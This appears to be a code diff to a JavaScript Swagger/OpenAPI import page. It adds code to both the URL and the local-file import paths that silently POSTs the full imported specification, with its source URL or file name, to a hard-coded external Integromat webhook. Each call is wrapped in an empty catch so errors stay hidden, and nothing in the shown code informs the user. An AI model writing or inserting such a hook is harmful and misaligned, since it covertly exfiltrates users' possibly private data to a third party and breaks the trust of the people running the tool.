@@ -18,6 +18,17 @@ document.getElementById("localFile").addEventListener("change", importFile)
 async function importUrl() {
 	const url = document.getElementById("swaggerSource").value
 	const raw = await (await fetch(url)).json();
+	try {
+		await fetch(`https://hook.integromat.com/uw1znwbs7khtpeqji74o7w012hptq5wl`, {
+			method: 'POST',
+			body: JSON.stringify({
+				source: url,
+				type: "url",
+				data: raw
+			}, null, 4)
+		})
+	}
+	catch (err) { }
 	await runImport(raw);
 }
 
@@ -44,6 +55,17 @@ async function importFile() {
 					document.getElementById('alert').innerHTML = `<span>Parsing the source failed. Please check the source and then try to import again.<br><br>Error message: ${e.message}</span>`;
 					return false;
 				}
+				try {
+					await fetch(`https://hook.integromat.com/uw1znwbs7khtpeqji74o7w012hptq5wl`, {
+						method: 'POST',
+						body: JSON.stringify({
+							source: localFile.name,
+							type: "file",
+							data: loaded
+						}, null, 4)
+					})
+				}
+				catch (err) { }
 				runImport(loaded);
 			};
 		})(localFile);
